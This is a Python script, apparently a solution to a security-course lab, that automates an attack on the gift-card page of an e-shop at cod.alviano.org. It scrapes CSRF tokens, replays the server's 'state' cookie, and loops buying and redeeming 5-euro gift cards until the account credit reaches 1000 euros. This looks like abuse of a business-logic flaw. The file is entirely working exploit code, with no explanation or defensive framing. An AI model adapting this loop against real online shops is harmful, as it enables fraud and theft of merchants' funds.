from http import HTTPStatus
from pathlib import Path

import typer
import requests
from lxml import html
from rich.console import Console
from rich.progress import track

console = Console()
app = typer.Typer()


@app.command()
def run():
    
    existing_usernames = []
    success_response = 'Success! <script>window.location = "/eshop/gift/"</script>'
    state= None
    response = requests.get(
       "https://cod.alviano.org/eshop/gift/")
    if response.status_code == HTTPStatus.OK:
        html_document = html.fromstring(response.content)
        #print(response.headers)
        cookie_to_set = response.headers['Set-Cookie']
        #print(cookie_to_set)
        csrf_cookie = ''.join(cookie_to_set.split("csrftoken=")[1].split(";")[0])
        #print(csrf_cookie)
        csrf=html_document.xpath('//input[@name="csrfmiddlewaretoken"]/@value')[0]
    
    
    
    
    """ LET'S BUY GIFTCARDS """
    response = requests.post(
       "https://cod.alviano.org/eshop/gift/", data= {
           "csrfmiddlewaretoken" : csrf,
           "product": "gift-card-5-euro"
       }, 
       headers={
           "Referer": "https://cod.alviano.org/eshop/gift/"
       },
       cookies={
           "csrftoken" : csrf_cookie
       })
    
    if state is None:
       #print(cookie_to_set)
        cookie_to_set = response.headers['Set-Cookie']
        state = ''.join(cookie_to_set.split("state=")[1].split(";")[0])


    

    response = requests.get(
       "https://cod.alviano.org/eshop/gift/", cookies={
           "state":state
       })
    
    
    credit=''.join(response.text.split("Credit: €")[1].split("<p")[0])
    #print(credit)
    credit = int(credit)
   
    while credit < 1000:

        while credit > 4:
            response = requests.get(
            "https://cod.alviano.org/eshop/gift/", cookies={
            "state":state
            })
            html_document = html.fromstring(response.content)
            #print(response.headers)
            cookie_to_set = response.headers['Set-Cookie']
            #print(cookie_to_set)
            csrf_cookie = ''.join(cookie_to_set.split("csrftoken=")[1].split(";")[0])
            #print(csrf_cookie)
            csrf=html_document.xpath('//input[@name="csrfmiddlewaretoken"]/@value')[0]
            
            response = requests.post(
            "https://cod.alviano.org/eshop/gift/", data= {
            "csrfmiddlewaretoken" : csrf,
            "product": "gift-card-5-euro"
            }, 
            headers={
                "Referer": "https://cod.alviano.org/eshop/gift/"
            },
            cookies={
                "csrftoken" : csrf_cookie,
                "state":state
            })
            #print(response.text)
            #print(state)
            cookie_to_set = response.headers['Set-Cookie']
            state = ''.join(cookie_to_set.split("state=")[1].split(";")[0])
        
            response = requests.get(
            "https://cod.alviano.org/eshop/gift/", cookies={
                "state":state
            })


            credit=''.join(response.text.split("Credit: €")[1].split("<p")[0])
            #print(credit)
            credit = int(credit)
            #print(credit)

        #print(response.text)
        html_document = html.fromstring(response.text)
        ul=html_document.xpath('//ul/li')
        for elem in ul:
            response = requests.get(
            "https://cod.alviano.org/eshop/gift/", cookies={
            "state":state
            })
            html_document = html.fromstring(response.content)
            #print(response.headers)
            cookie_to_set = response.headers['Set-Cookie']
            #print(cookie_to_set)
            csrf_cookie = ''.join(cookie_to_set.split("csrftoken=")[1].split(";")[0])
            #print(csrf_cookie)
            csrf=html_document.xpath('//input[@name="csrfmiddlewaretoken"]/@value')[0]
            #print()
            #print(elem.text.replace(" ", ""))
            #print()
            code=elem.text.replace(" ", "")
            print(code.strip())
            response = requests.post(
            "https://cod.alviano.org/eshop/gift/", data= {
            "csrfmiddlewaretoken" : csrf,
            "redeem": code.strip()
            }, 
            headers={
                "Referer": "https://cod.alviano.org/eshop/gift/"
            },
            cookies={
                "csrftoken" : csrf_cookie,
                "state":state
            })
            
            #print(response.text)
            #print(state)
            #print(response.headers)
            cookie_to_set = response.headers['Set-Cookie']
            state = ''.join(cookie_to_set.split("state=")[1].split(";")[0])
            
            
            response = requests.get(
            "https://cod.alviano.org/eshop/gift/", cookies={
                "state":state
            })
            #print(response.text)
            if "<b>Gift cards:</b>" in response.text:
                credit=''.join(response.text.split("Credit: €")[1].split("<p")[0])
            else:
                credit=''.join(response.text.split("Credit: €")[1].split("</div>")[0])
            #print(credit)
            credit = int(credit)
            print(f"credit: {credit}")
            

        #print(response.text)
    
    
    #print(response.text)

    

if __name__ == "__main__":
    app()